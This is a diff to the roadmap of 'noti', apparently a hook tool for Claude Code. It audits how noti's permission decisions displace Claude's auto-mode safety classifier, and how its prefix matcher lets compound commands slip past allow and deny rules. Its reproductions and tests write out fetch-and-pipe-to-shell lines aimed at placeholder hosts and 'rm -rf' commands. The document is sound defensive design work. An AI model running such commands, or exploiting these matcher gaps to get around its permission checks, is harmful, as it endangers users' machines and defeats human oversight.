@@ -1,8 +1,10 @@
 # DEV.md — the roadmap
 
 This file is the forward-looking spec: which Claude Code hook events noti
-adopts, skips, or still owes a decision, and the feature backlog behind them.
-It exists so that growth is as deliberate as the current code. How to *change*
+adopts, skips, or still owes a decision, the corrections it owes its own policy
+engine, and the feature backlog behind them. It exists so that growth is as
+deliberate as the current code — and, where upstream has moved under us, so
+that the retreat is as deliberate as the growth. How to *change*
 the code lives in [CONTRIBUTING.md](CONTRIBUTING.md); agent guidance lives in
 [CLAUDE.md](CLAUDE.md) — if a sentence would fit in either of those, it does
 not belong here. Nothing ships that isn't on this roadmap or trivially in its
@@ -25,32 +27,212 @@ Explicit non-goals, so they don't creep back in:
   worktrees) — ccbaton's lane.
 - **Narrating success** — the terminal already shows what Claude did.
 
+## The auto-mode reckoning (2026-09-09)
+
+The charter above is unchanged. What changed is the world it runs in — and one
+sentence of the code now contradicts the docs it was written against.
+
+`evaluate()` step 3 says of auto mode: *"auto mode falls through: noti's toast
+simply replaces the prompt the classifier would have shown."* **That premise is
+false.** PreToolUse fires *before* the permission classifier, so in auto mode
+there is no prompt to replace — noti manufactures one. Auto mode is also now
+the built-in starting permission mode on Pro, Max, and Team plans, so this is
+the majority path, not an edge case.
+
+### The measurement
+
+165 governed tool calls, replayed from seven real transcripts through
+`evaluate()` with `permission_mode: "auto"`:
+
+| noti verdict | count | share |
+|---|---|---|
+| prompt (a blocking toast) | 85 | 51.5% |
+| allow | 77 | 46.7% |
+| question | 3 | 1.8% |
+
+Those 85 toasts, sorted by what auto mode would have done instead:
+
+| What auto mode actually does | count | share of toasts |
+|---|---|---|
+| Bash → classifier review | 38 | 44.2% |
+| Edit inside the working dir → **auto-approved, classifier never called** | 38 | 44.2% |
+| Edit outside the working dir → may prompt | 6 | 7.0% |
+| bare `cd` into a dir → treated as read-only | 4 | 4.7% |
+
+**Half of every toast noti fires in auto mode is for an action auto mode
+approves without so much as a classifier call.** In default mode noti was
+friction-neutral — the same number of decisions, on a better surface. In auto
+mode it is friction-*additive*: a blocking modal in front of 38 of 47 file
+edits.
+
+### The inversion
+
+The other half fails differently. noti's `allow` is a `permissionDecision`,
+which short-circuits the permission flow — so noti does not merely *precede*
+the classifier, it *replaces* it. What it substitutes: a 14-entry static
+prefix safe-list, and a human reading 220 truncated characters in a screen
+corner. What it displaces: a Sonnet-5 classifier that reads the transcript,
+CLAUDE.md, trusted-infrastructure config, boundaries stated in conversation,
+protected and critical paths, and a `git status` probe before any command that
+would discard uncommitted work.
+
+noti was built when it was the only thing between Claude and the machine
+besides a y/n prompt. It no longer is. A toast that interposes on a
+better-informed decider is not a summons — it is narration with a button, and
+the charter test rejects it.
+
+### What noti is for now
+
+Unchanged in one sentence: **surface only the moments a human is actually
+needed.** Auto mode did not delete those moments, it moved them. It absorbed
+the routine ones (which noti still fires on) and created new ones (which noti
+is silent about — see the `PermissionDenied` row).
+
+The strategic call, which the rest of this file now assumes: **the PreToolUse
+permission UI is a Manual-mode feature.** Keep it correct, keep it good, stop
+treating it as the product. The product is the away-from-keyboard surface for
+the moments auto mode escalates.
+
+## Policy corrections
+
+Five defects found 2026-09-09 against Claude Code 2.1.266. C1 is the reckoning
+above reduced to a code change. C2–C5 are matcher drift: noti's rule engine and
+Claude's have diverged, and in three of them noti is *broader* than Claude —
+the one direction CLAUDE.md names as never safe. C2 and C3 are live in any
+install with a prefix rule, in every permission mode, and are not covered by
+`test.sh`.
+
+Ship order follows the tags, not the numbering: C2/C3 first (exploitable
+today, in every permission mode), then C1 (the clunk), then C4, then C5. Each lands with the regression tests named below; per
+CONTRIBUTING these encode fixed vulnerabilities and never get weakened later.
+
+### C1 — auto mode must defer, not prompt (P0)
+
+- **Claude**: the classifier decides, having seen far more than noti does.
+  Read-only actions and working-directory edits never reach it at all.
+- **noti**: `mode in ("bypassPermissions", "plan", "dontAsk")` omits `auto`, so
+  it falls through to a blocking toast on every governed call that misses the
+  safe-list.
+- **Fix**: add `"auto"` to that tuple. noti goes inert as a permission UI in
+  auto mode and keeps every non-blocking surface it already ships — Stop
+  summary, StopFailure, `permission_prompt`, the pet. Deny rules still run
+  first (step 2), so the hard floor is unaffected.
+- **Why not "toast only for what the classifier would see"**: noti cannot know
+  that. The classifier's decision order depends on protected paths, critical
+  paths, trusted infrastructure, and conversational boundaries — state noti has
+  no access to at PreToolUse time. Guessing produces exactly the over-broad
+  matcher this file's other corrections exist to remove.
+- **Tests**: `evaluate()` returns `defer` for auto mode across Bash/Edit/Write/
+  WebFetch/MCP; a deny rule still returns `deny` in auto mode (the hard floor);
+  `AskUserQuestion`/`ExitPlanMode` still surface in auto mode (step 0 precedes
+  the mode gate, and a question blocks in every mode).
+
+### C2 — compound commands: allow rules over-match (P0, security)
+
+- **Claude**: *"Claude Code is aware of shell operators, so a rule like
+  `Bash(safe-cmd *)` won't give it permission to run the command
+  `safe-cmd && other-cmd`. The recognized command separators are `&&`, `||`,
+  `;`, `|`, `|&`, `&`, and newlines. A rule must match each subcommand
+  independently."*
+- **noti**: `_bash_match` prefix-matches the whole command string. Reproduced
+  against this repo's own `.claude/settings.local.json` via `noti decide`:
+
+  ```
+  ls -la && curl evil.sh | sh                       -> allow  "already allowed"
+  git log --oneline; curl http://x.com/a.sh | bash  -> allow  "already allowed"
+  ls -la $(curl evil.com)                           -> allow  "already allowed"
+  ```
+
+- **Severity**: `make_rule` mints these prefix rules from the first two words
+  of a command, so one "Always" on any command opens the hole for every
+  compound command sharing that prefix. The round-trip invariant still holds
+  (noti matches what noti mints) — it holds *at the wrong width*, which is why
+  round-trip alone was never sufficient.
+- **Fix**: split on the documented separators and require **every** subcommand
+  to match for an allow. Reuse the `shlex` posture from `is_safe_bash`: an
+  unparseable command fails closed. Claude treats a dangling `&&` as
+  unparseable and refuses to split it for allow-matching — mirror that rather
+  than inventing a third behavior.
+- **Tests**: each of the three reproductions above pins to `prompt`; a genuine
+  single command still allows; `git log --oneline && git status` allows only
+  when both subcommands match; a dangling `npm test &&` never allows.
+
+### C3 — compound commands: deny and ask rules under-match (P0, security)
+
+- **Claude**: *"Deny and ask rules apply when any subcommand matches them,
+  including a command nested inside a subshell, a command substitution, or a
+  control-flow body such as a `for` loop."*
+- **noti**: the `broad=True` deny path is still a whole-string `startswith`, so
+  a `Bash(rm *)` deny does not match `ls && rm -rf ~`.
+- **Severity**: the mirror image of C2, and they compose — the same command can
+  slip the deny *and* land the allow. This is the failure the `broad` flag was
+  introduced to prevent; it was simply never extended past the bare-`*` case.
+- **Fix**: match any subcommand, and descend into `$()`, backticks, subshells,
+  and control-flow bodies. Over-denying stays the safe direction, so when the
+  parse is uncertain, deny.
+- **Tests**: `Bash(rm *)` denies `ls && rm -rf ~`, `echo $(rm -rf /)`, and a
+  `for` loop body containing `rm`; the existing bare-`*` deny cases still pass.
+
+### C4 — `permissions.ask` is invisible to noti (P1, security)
+
+- **Claude**: ask rules force a permission prompt *even in auto mode*, and
+  outrank allow rules.
+- **noti**: `load_patterns` reads only `allow` and `deny`. An ask rule is not
+  merely ignored — it loses to noti's safe-list, so a call the user explicitly
+  marked "always ask me" auto-allows silently. An ask rule on `Bash(grep *)`
+  is defeated by the `grep` entry in `bash_safe_commands`.
+- **Fix**: load `ask` as a third pattern kind, matched with C3's any-subcommand
+  semantics, checked after deny and before every allow path *and* before the
+  safe-list. An ask match forces the toast; it must never auto-allow.
+- **Tests**: an ask rule beats the safe-list, beats an allow rule, and loses to
+  a deny rule — the full precedence ladder pinned in one case each.
+
+### C5 — noti honors allow rules that auto mode deliberately drops (P2)
+
+- **Claude**: *"On entering auto mode, broad allow rules that grant arbitrary
+  code execution are dropped"* — blanket `Bash(*)`/`PowerShell(*)`, wildcarded
+  interpreters like `Bash(python*)`, package-manager run commands, `Agent`
+  rules, and `Monitor` rules. They are restored on leaving auto mode.
+- **noti**: reads the settings files directly and honors every allow rule in
+  every mode, so it can allow via a rule Claude has disarmed for that session.
+- **Severity**: subsumed by C1 for auto mode (deferring never consults allow
+  rules), so this is defence-in-depth rather than an independent P0 — but it is
+  the rule that keeps noti honest if the C1 gate is ever narrowed.
+- **Fix**: drop the same rule shapes from `load_patterns("allow")` when
+  `permission_mode == "auto"`. Deny and ask rules are never dropped.
+- **Tests**: `Bash(python*)` allows in default mode and does not in auto mode;
+  a narrow `Bash(npm test)` survives in both.
+
 ## Hook event inventory
 
-Claude Code exposes ~29 hook events (snapshot of
+Claude Code exposes ~30 hook events (snapshot of
 [code.claude.com/docs/en/hooks](https://code.claude.com/docs/en/hooks.md),
-**2026-07-06** — re-verify against the live docs before acting on a row).
-noti registers two. Consistency does not mean hooking more events; it means
-**every event has a verdict**, so a skip is a decision with a reason, not an
-omission.
+**re-verified 2026-09-09** against Claude Code 2.1.266 — re-verify again
+before acting on a row). noti registers six: PreToolUse, Stop, StopFailure,
+Notification, UserPromptSubmit, SessionEnd. Consistency does not mean hooking
+more events; it means **every event has a verdict**, so a skip is a decision
+with a reason, not an omission.
 
 Verdicts: `shipped` · `adopt-P1` · `adopt-P2` · `investigate` · `skip`.
 
 | Event (matcher) | Verdict | Why |
 |---|---|---|
-| PreToolUse | shipped | The core: approval/question/plan toasts. The only handler that may ever emit a decision (R1). |
+| PreToolUse | shipped | The core: approval/question/plan toasts. The only handler that may ever emit a decision (R1). Fires **before** the permission classifier, which is why C1 makes auto mode a defer — see [the reckoning](#the-auto-mode-reckoning-2026-09-09). |
 | Stop | shipped | End-of-turn summary + tally. Inert by design — never blocks (R2). |
 | Notification / `permission_prompt` | **shipped 2026-07-16** | The flagship gap, closed: when noti falls back (toast timeout, Esc, ungoverned tool) a notify-only `note` toast says a permission prompt is waiting. Deliberate hand-offs (Esc, plan View, complex-set notice) dedup via a 10s `.deferred` marker beside the tally — Esc vs timeout told apart by elapsed time, since the binary exits 124 for both. Also stands the pet's `waiting` summons, which covers ungoverned tools. Kill-switch `alerts.terminal_prompt`. |
 | StopFailure (all reasons) | **shipped 2026-07-08** | Turn died on rate-limit/auth/server error; the user waits for a summary toast that never comes. Red `error` toast with reason copy + the dead turn's tally as footer; also stands the pet's `failed` summons. Kill-switch `alerts.stop_failure`. Existing installs need `noti uninstall && noti install` to register the new event. |
 | PostToolUseFailure | **adopt-P2** | Silent tally-only, so the summary can say "· 1 failed" — the difference between "done" and "done, but look". Never a per-failure toast (spam). |
 | Elicitation / ElicitationResult | investigate | An MCP server blocking the session on user input is AskUserQuestion's class, but the contract needs a spike first. |
-| Notification / `elicitation_*` | investigate | Folded into the Elicitation spike — same question. |
+| Notification / `elicitation_*` | investigate | Folded into the Elicitation spike — same question. Concrete subtypes confirmed 2026-09-09: `elicitation_dialog`, `elicitation_url_dialog`, `elicitation_complete`, `elicitation_response`. The first two are the candidate summons; the latter two are completion narration and would skip on their own. |
 | Notification / `agent_needs_input`, `agent_completed` | investigate | A background agent blocked on a human is in-charter (v2.1.198+), but spike whether any terminal UI accompanies it before designing copy. |
 | SessionStart | investigate | Housekeeping-only candidate (sweep stale tally/slot files at startup). Its stdout becomes model context, so the handler must print nothing (R4). Never a toast. |
 | Notification / `idle_prompt` | skip | The Stop summary already announces end-of-turn; a user who set `summary.enabled: false` chose silence — don't reintroduce the nag through a side door. |
 | Notification / `auth_success` | skip | Not a human-in-the-loop moment; the terminal shows it. |
-| PermissionRequest | skip | Two deciders in one chain is answer-integrity confusion — noti already decided upstream at PreToolUse, and this event doesn't fire headless. Revisit only if `updatedPermissions`/`setMode` becomes the sole way to mint rules Claude honors natively. |
-| PermissionDenied | skip | Retry-on-deny is policy, not notification; the deny already surfaced. |
+| Notification / `quota_auto_resume_stale` | **adopt-P2** | New since the 2026-07 snapshot. The session queued itself to resume when quota reset and the resume went stale — so work the user believes is queued is not going to happen. A human is needed and nothing else tells them. Rides `hook_stopfailure`'s copy-map posture and its `error` kind. |
+| Notification / `quota_auto_resume_fired` | skip | The resume worked; the turn will end in a Stop summary like any other. Narration. |
+| Notification / `quota_auto_resume_disabled` | skip | A state change the user made, not a summons. |
+| PermissionRequest | skip | Two deciders in one chain is answer-integrity confusion — noti already decided upstream at PreToolUse. Re-checked 2026-09-09: its auto-mode behavior is still undocumented, and exit 2 is not honored (deny goes through a `decision` object), so adopting it would mean a second decider on an unspecified contract. Revisit only if `updatedPermissions`/`setMode` becomes the sole way to mint rules Claude honors natively. |
+| PermissionDenied | **adopt-P1** | Verdict flipped 2026-09-09. The 2026-07 skip assumed a deny the user had just issued — but this event now fires **when auto mode denies a tool call**, i.e. when the classifier blocked something the human never saw. Claude retries an alternative and works around it silently; the human learns nothing until they read scrollback. That is the charter, exactly. Notify-only: noti must never send `hookSpecificOutput.retry` (R1). Design below. |
 | SubagentStop | skip | Subagent completion is orchestration narration (herdr), and the event is blocking-capable — adopting it would tempt a second decider (R1/R2). |
 | SubagentStart | skip | Pure narration. |
 | SessionEnd | **shipped 2026-07-16** | Never a toast (telling the user they ended a session is noise) — but the pet must know: a session closed mid-prompt left a zombie summons standing until the waiting TTL. The handler silently reaps that session's pet state file, nothing else. |
@@ -132,6 +314,52 @@ notification time) to ungoverned tools.
 - Config: `summary.show_failures` as the rendering knob; the count is always
   recorded (cheap, and the StopFailure footer can use it).
 
+### PermissionDenied — the classifier blocked something you never saw (P1)
+
+The flagship gap of the auto-mode era, and the reason this event's 2026-07
+skip was wrong. In auto mode a classifier block is *silent by construction*:
+Claude receives the reason (usually the fixed text `Blocked by classifier`),
+tries an alternative, and keeps working. The action lands in `/permissions` ›
+**Recently denied**, where `r` retries it with a manual approval — a surface
+nobody opens unattended. A human is needed to decide whether the block was
+right, and today nothing summons them.
+
+- Register `PermissionDenied`, no matcher (all tools), `noti hook
+  permissiondenied`, no timeout. New branch in `cmd_hook`, same fail-open
+  wrapper.
+- **Notify-only, always.** The event accepts `hookSpecificOutput.retry: true`
+  to tell the model it may retry. noti must never send it: R1 gives exactly one
+  handler a decision, and retry-on-deny is policy, not notification — the
+  original skip was right about *that* half and it survives the flip.
+- Non-blocking `note` toast: title = project basename, body "Claude Code
+  blocked an action — /permissions › Recently denied, press r to retry",
+  footer = the tool and a truncated `render_call` message so the user knows
+  *what* was blocked without opening the terminal. Terracotta, not red: this
+  is "Claude wants me", not "something broke".
+- **Coalesce (P0 within this design).** The classifier blocks up to 3 times
+  consecutively before auto mode pauses, and Claude retries alternatives in
+  between — so the naive handler fires a toast per block. One toast per
+  session per cooldown window (`alerts.denied_cooldown_seconds`, default 60);
+  subsequent blocks inside the window update nothing and show nothing. Without
+  this the feature is a spam generator and fails the charter on its own terms.
+- **Dedup (R5).** Repeated blocks pause auto mode and Claude Code resumes
+  prompting, which fires `Notification / permission_prompt` seconds later —
+  the same human moment, arriving twice. Reuse the reference implementation:
+  the handler drops a `denied` marker beside the tally, and `hook_notification`
+  suppresses on it within the existing ~10s window. A missing or unreadable
+  marker degrades to *show* (fail-toast, never fail-silent), so the copy above
+  carries the actionable instruction on its own and is correct standing alone.
+- **Subagents.** This is a tool event, so it fires inside subagents carrying
+  `agent_id`. A subagent blocked by the classifier is genuinely human-needed,
+  but N parallel agents are N toasts — the cooldown is per session, not per
+  agent, precisely so a fan-out cannot multiply it.
+- **No verdict is invisible.** When the classifier produces no verdict, Claude
+  Code denies *without* the notification or the Recently-denied entry. The hook
+  still fires ("including denials without a classifier verdict"), so noti is
+  the only surface that can report it — spike whether the payload distinguishes
+  the two cases before writing copy that claims which happened.
+- Kill-switch: `alerts.permission_denied`.
+
 ## Under investigation
 
 Each item is gated by one question a spike must answer first (the
@@ -146,6 +374,22 @@ Each item is gated by one question a spike must answer first (the
   agent prompts show any terminal UI at all? If a blocked background agent is
   truly invisible today, this graduates to P1: it is `permission_prompt`'s
   rationale one step removed. `agent_completed` likely stays skip (narration).
+- **Subagent tool calls** — PreToolUse fires inside subagents with `agent_id`
+  and `agent_type` set; noti reads neither. 25 of the 165 calls measured for
+  the reckoning were subagent calls. Two questions before designing: does a
+  human watching a fan-out want N stacked blocking toasts for work they are not
+  reading, and do concurrent subagents share a `session_id` (if so they
+  currently overwrite each other's pet state file, which is a bug regardless of
+  the answer to the first). C1 defuses the toast half in auto mode; the pet
+  state collision survives it.
+- **Auto mode paused** — after 3 consecutive or 20 total classifier blocks,
+  auto mode pauses and the session silently reverts to prompting. Confirmed
+  2026-09-09: **no hook event or notification is documented for the pause
+  itself.** It is partially covered already — the next prompt fires
+  `Notification / permission_prompt`, which noti ships — so the user is
+  summoned, just not told why. Adopt nothing until upstream exposes the
+  transition; the spike question is whether the pause is inferable from the
+  `PermissionDenied` stream without guessing.
 - **SessionStart housekeeping** — adopt only if stale tally/slot files show
   up in practice; the existing 48h sweep (noti:807) may be enough, and a
   third hook on every session start is not free. If adopted: matcher
@@ -204,6 +448,15 @@ these govern growth.
 - **R7 — Observed-behavior features get kill-switches.** Anything built on
   undocumented upstream behavior ships with a config key that fully disables
   it without a code change (precedent: `approval.question_other`).
+- **R8 — Never out-vote a better-informed decider.** noti may narrow what
+  Claude would allow; it may never widen it, and it may never substitute its
+  own judgment for a decider that sees more than noti does. In default mode an
+  `allow` displaces a y/n prompt backed by no more information than noti has —
+  parity, and the whole point. In auto mode the same `allow` displaces a model
+  reading the transcript, CLAUDE.md, and the trust boundary — a downgrade
+  dressed as a convenience. The safe-list exists to skip *noti's* toast, never
+  *Claude's* review. Every future mode gets this question asked before noti
+  emits a decision in it.
 
 ## Non-hook backlog
 
@@ -213,6 +466,10 @@ these govern growth.
 | P1 | Other-editor countdown pause | While the free-text editor is open, pause or extend the deadline drain (≤15s grace). Timing out mid-sentence is the accidental-loss class noti exists to prevent. Swift-side; interacts with the all-or-nothing question-set deadline. |
 | P1 | `noti ask --other` CLI flag | Expose the free-text row to the reusable primitive — the exit-10 / RC_OTHER contract already exists. One README line under "Reusable primitives". |
 | P2 | Denials in the tally | `tally_record` learns a `denied` count (recorded at decision time in `hook_pretooluse`); summary reads "· denied 1". Pairs with PostToolUseFailure's `failed`. |
+| P1 | Install with an `if` filter | Hook config now supports `if` (permission-rule syntax, tool events only): `"if": "Bash(git *)"` and the hook only runs when the call matches. Today `cmd_install` writes a broad `matcher` regex and noti spawns a Python process for every governed call just to defer on most of them. Moving the coarse filter upstream cuts process spawns and makes the deferred cases free. Note the documented asymmetry: `if` descends into `$()`/backticks and runs the hook on `$VAR` command names it cannot resolve — it fails *open* toward running, so it can narrow work but must never be relied on as a security boundary. |
+| P1 | Gate on `agent_id` | Skip the toast for subagent tool calls (config: `approval.govern_subagents`, default off once C1 lands). Pairs with the subagent investigate item; the pet-state collision is the separate half. |
+| P2 | Doctor: auto-mode posture | `doctor` reports the session-independent facts a user needs after C1: whether `permissions.defaultMode` is `auto`, and that noti's permission UI is inert there. Prevents the "noti stopped working" bug report that C1 will otherwise generate. |
+| P2 | Refresh stale `noti:NNN` references | The `noti:` line refs throughout this file predate several releases — `cmd_hook` is cited as noti:1169 but lives at 1701, `cmd_install` as noti:1264 but lives at 1804. Either re-stamp them or drop to symbol names, which do not rot. |
 | P2 | Doctor: managed-settings warning | Promote the README known-limitation: if `/Library/Application Support/ClaudeCode/managed-settings.json` exists, warn that its deny rules are invisible to noti and suggest emptying `bash_safe_commands`. Read-only check, zero-dep. |
 | P2 | Doctor: hook-coverage drift | Compare installed event set against this version's shipped set; "install predates `<event>` — `noti uninstall && noti install`". R6's enforcement arm. |
 | P2 | Opt-in per-toast sound | Accessibility: `toast.sound` (default false). NSSound is AppKit — zero-dep holds. Distinct (or no) sound for summary vs ask, so ask stays salient. |
@@ -361,8 +618,21 @@ Sketch (all of it gated on a `docs/spikes/` spike first):
 - **`updatedInput` non-label answers** are spike-verified observed behavior,
   not documented API. If a future Claude Code rejects them, flip
   `approval.question_other: false` (the R7 precedent).
-- **The hook inventory drifts.** The table above is stamped 2026-07-06;
-  re-verify an event against the live docs before implementing its row.
+- **The hook inventory drifts.** The table above is stamped 2026-09-09;
+  re-verify an event against the live docs before implementing its row. The
+  2026-07 stamp went four releases stale and cost a wrong verdict
+  (`PermissionDenied`) plus a false premise in `evaluate()` — re-verification
+  is the cheapest correctness work in this repo.
+- **Claude's Bash matcher is the spec, and it moves.** C2–C4 exist because
+  noti reimplements a matcher that is documented, versioned, and not ours.
+  Re-read the compound-command, wrapper, and read-only-command sections of the
+  permissions doc before touching `_bash_match`, and treat any divergence where
+  noti is broader as a security bug, not a style difference.
+- **Auto mode's decision order is not noti's to model.** Protected paths,
+  critical paths, trusted infrastructure, and conversational boundaries all
+  steer the classifier and are invisible at PreToolUse time. C1 defers rather
+  than predicts for this reason; any future "smart" auto-mode toast must
+  explain how it avoids guessing at state it cannot see (R8).
 - **`stop_hook_active` semantics** — matters only if R2 is ever revisited;
   document, don't rely.
 - **Notification sub-types** — `agent_needs_input`/`agent_completed` are new
